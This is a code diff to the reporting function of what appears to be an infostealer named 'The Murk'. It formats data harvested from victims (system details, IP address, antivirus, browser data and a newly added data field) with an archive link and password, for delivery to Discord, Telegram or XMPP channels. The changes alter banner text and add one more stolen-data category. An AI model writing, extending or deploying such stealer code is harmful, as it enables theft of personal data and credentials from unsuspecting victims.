@@ -13,7 +13,7 @@ from requests import post, get
 from os import remove
 
 
-def Send(type,np,data,dataB,dataO,dataW,dataF,discordData,TelegramData,xmppData):
+def Send(type,np,data,dataB,dataO,dataW,dataF,dataV,discordData,TelegramData,xmppData):
 	if type == 2:
 		from xmpp import protocol,Client
 	if type == 0:
@@ -42,19 +42,12 @@ def Send(type,np,data,dataB,dataO,dataW,dataF,discordData,TelegramData,xmppData)
 		message = ''
 		try:
 			if type == 0:
-				title = f"▀▀█▀▀ █──█ █▀▀ 　 ░█▀▄▀█ █──█ █▀▀█ █─█ 　 █▀▀█ █▀▀ █▀▀ █──█ █── ▀▀█▀▀ █▀▀\n─░█── █▀▀█ █▀▀ 　 ░█░█░█ █──█ █▄▄▀ █▀▄ 　 █▄▄▀ █▀▀ ▀▀█ █──█ █── ──█── ▀▀█\n─░█── ▀──▀ ▀▀▀ 　 ░█──░█ ─▀▀▀ ▀─▀▀ ▀─▀ 　 ▀─▀▀ ▀▀▀ ▀▀▀ ─▀▀▀ ▀▀▀ ──▀── ▀▀▀\n[Link🔗]({url})\nPassword: ||{np[1]}||\n\n>>> **Collected data**"
+				title = f"**:regional_indicator_t: :regional_indicator_h: :regional_indicator_e:  :regional_indicator_m: :regional_indicator_u: :regional_indicator_r: :regional_indicator_k:  :regional_indicator_r: :regional_indicator_e: :regional_indicator_s: :regional_indicator_u: :regional_indicator_l: :regional_indicator_t: :regional_indicator_s: **\n\n[🔗Link]({url})\n📜Password: ||{np[1]}||\n\n**⇓Collected data⇓**"
 			if type == 1 or type == 2:
-				title = f"▀▀█▀▀ █──█ █▀▀ 　 ░█▀▄▀█ █──█ █▀▀█ █─█\n─░█── █▀▀█ █▀▀ 　 ░█░█░█ █──█ █▄▄▀ █▀▄ \n─░█── ▀──▀ ▀▀▀ 　 ░█──░█ ─▀▀▀ ▀─▀▀ ▀─▀\nLink🔗:{url}\nPassword: {np[1]}\n\n⇓Collected data⇓"			
+				title = f"<b>🛑hey bro, see The Murk results🛑</b>\n🔗Link:{url}\n📜Password: {np[1]}\n\n<b>⇓Collected data⇓</b>"			
 			message += f"{title}"
 			try:
-				message += f'\n⏲Date: {data[0]}'
-				message += f'\n🖥System: {data[1]}'
-				message += f'\n👤PCname: {data[2]}'
-				message += f'\n👤Username: {data[3]}'
-				message += f'\n🔧CPU: {data[4]}'
-				message += f'\n🔧GPU: {data[5]}'
-				message += f'\n📡IP: {data[6]}'
-				message += f'\n🛡Antivirus: {data[7]}'
+				message += data
 			except Exception as e:
 				print(e)
 		except Exception as e:
@@ -63,13 +56,18 @@ def Send(type,np,data,dataB,dataO,dataW,dataF,discordData,TelegramData,xmppData)
 			if dataB:
 				for text in dataB:
 					message+= text
-			message+="\n\n🎰Other"
 
 		except Exception as e:
 			print(e)
 		try:
 			if dataO:
 				for text in dataO:
+					message+= text
+		except Exception as e:
+			print(e)
+		try:
+			if dataV:
+				for text in dataV:
 					message+= text
 		except Exception as e:
 			print(e)
